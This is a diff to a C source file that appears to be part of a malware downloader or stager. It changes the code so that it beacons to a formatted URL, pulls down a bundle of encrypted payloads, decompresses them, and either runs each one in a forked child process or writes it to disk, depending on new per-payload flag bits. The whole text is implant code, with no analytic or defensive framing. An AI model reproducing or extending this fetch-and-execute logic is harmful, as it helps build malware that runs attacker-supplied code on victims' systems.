@@ -30,7 +30,7 @@ int main(int argc, char **argv)
     if (formattedURL == NULL)
         return -1;
     
-    payload = beacon(PAYLOAD_URL);
+    payload = beacon(formattedURL);
     payloadOffset = payload.memory; // hold for iteration
     numPayloads = extractInt(payloadOffset);
 
@@ -105,14 +105,17 @@ int main(int argc, char **argv)
             }
             else
             {
-                wait(&child); // wait for child to finish within parent
+                if (payloadMeta[i].flags & 0x1)
+                    wait(&child); // wait for child to finish within parent
             }
         }
         else
         {
-            sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
-            writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
-            numFiles++;
+            if (payloadMeta[i].flags & 0x2){
+                sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
+                writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
+                numFiles++;
+            }
         }
         free(decompressed);
         payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
